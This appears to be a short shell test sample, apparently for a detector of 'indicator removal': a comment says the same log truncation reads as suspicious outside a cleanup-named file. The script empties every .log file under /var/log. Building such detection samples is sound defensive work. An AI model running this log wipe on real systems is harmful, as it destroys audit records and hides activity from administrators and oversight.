#!/bin/sh -e
# No cleanup identity: same truncation outside a *-cleanup.sh file still
# reads as indicator removal.
if [ -d /var/log ]; then
    find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;
fi
